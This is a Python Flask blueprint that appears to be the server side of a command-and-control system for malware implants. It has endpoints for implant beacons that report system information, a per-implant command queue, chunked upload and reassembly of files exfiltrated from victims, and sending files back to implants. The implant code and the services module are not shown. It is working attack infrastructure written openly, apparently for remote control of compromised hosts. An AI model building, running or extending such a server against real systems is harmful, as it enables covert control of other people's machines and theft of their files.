from flask import Blueprint, request, jsonify
from app.api import services

import logging


logging.basicConfig(level=logging.DEBUG)

BP = Blueprint("api", __name__, url_prefix="/api/v1")


@BP.route("/beacon", methods=["POST"])
def beacon():
    data = request.get_json()
    timestamp = data.get("timestamp")
    implant_uuid = data.get("uuid")
    system_info = data

    logging.info(
        f"Received beacon from {implant_uuid} at {timestamp} seconds: {system_info}"
    )

    command_response = services.process_beacon(implant_uuid)
    return jsonify(command_response)


@BP.route("/command", methods=["POST"])
def command():
    data = request.get_json()
    command_text = data.get("command")
    implant_uuid = data.get("uuid")

    if not command_text or not implant_uuid:
        return jsonify({"status": "Invalid command or UUID"}), 400

    result = services.add_command_to_queue(implant_uuid, command_text)
    if result:
        return jsonify({"message": "Command added to queue successfully"}), 200
    else:
        return jsonify({"message": "Given UUID is not in use."}), 404


@BP.route("/uuids", methods=["GET"])
def list_uuids():
    uuids = services.list_all_uuids()
    return jsonify(uuids)


@BP.route("/commands/<uuid>", methods=["GET"])
def get_commands(uuid):
    commands = services.get_commands_for_uuid(uuid)
    if commands is None:
        return jsonify({"message": "No commands found"}), 404
    return jsonify(commands), 200


# endpoint for the implant that receives chunks
@BP.route("/files", methods=["POST"])
def post_file():
    data = request.get_json()
    implant_uuid = data.get("uuid")
    file_id = data.get("file_id")
    chunk_index = data.get("chunk_index")
    chunk_data = data.get("chunk_data")

    if not (implant_uuid and file_id and chunk_index is not None and chunk_data):
        return jsonify({"status": "Invalid data"}), 400

    services.save_file_chunk(implant_uuid, file_id, chunk_index, chunk_data)

    logging.debug(f"Received chunk from {implant_uuid}")

    return jsonify({"status": "Chunk received"}), 200


@BP.route("/files/<file_id>", methods=["GET"])
def get_file(file_id):
    encoded_file_data, file_type = services.assemble_file(file_id)

    if encoded_file_data is None:
        return jsonify({"message": "No file with given id found"}), 404

    return jsonify({"file_type": file_type, "encoded_file": encoded_file_data}), 200


@BP.route("/files", methods=["GET"])
def get_files():
    # {implant_uuid: [file1_id, file2_id...]}
    file_ids = services.get_file_ids()

    if file_ids is None:
        return jsonify({"message": "No files found"}), 404
    return jsonify(file_ids), 200


@BP.route("/send_file", methods=["POST"])
def send_file():
    data = request.get_json()
    implant_uuid = data.get("uuid")
    file_path = data.get("file_path")

    if not implant_uuid or not file_path:
        return jsonify({"status": "Invalid data"}), 400

    return services.stream_file(file_path)
